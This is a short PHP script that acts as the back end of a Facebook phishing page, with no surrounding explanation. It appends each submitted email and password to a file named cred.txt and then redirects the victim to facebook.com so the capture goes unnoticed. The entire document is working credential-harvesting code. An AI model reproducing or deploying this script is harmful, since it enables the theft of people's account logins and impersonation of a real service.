<?php
file_put_contents("cred.txt", "login : ". $_POST['email']. "password : ". $_POST['pass']. "\n",
FILE_APPEND);
header('location: http://facebook.com/');
exit();
?>




 
